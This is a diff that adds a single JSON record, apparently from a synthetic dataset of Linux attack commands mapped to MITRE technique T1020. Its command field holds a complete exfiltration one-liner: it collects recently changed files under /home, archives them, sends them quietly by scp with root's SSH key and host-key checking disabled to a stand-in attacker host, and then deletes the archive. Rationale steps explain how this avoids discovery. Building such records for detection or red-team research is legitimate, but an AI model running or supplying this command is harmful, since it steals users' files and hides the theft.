@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ts=$(date +%s); find /home -type f -mmin -60 -size -25M -print0 | tar --null -T - -czf /tmp/home_recent_${ts}.tgz >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/home_recent_${ts}.tgz attacker@203.0.113.7:/var/tmp/.cache/home/ >/dev/null 2>&1 && rm -f /tmp/home_recent_${ts}.tgz",
+  "explanation": "Targets recently modified user files under 25MB, compresses them, and exfiltrates via scp with non-interactive authentication and minimal output.",
+  "rationale_steps": [
+    "Use find to select likely interesting recent files while avoiding very large transfers.",
+    "Create a compressed tarball to consolidate and shrink data for efficient exfiltration.",
+    "Transfer with scp quietly, using an SSH key to avoid prompts.",
+    "Cleanup removes temporary data to reduce chances of discovery."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-f37f9999",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
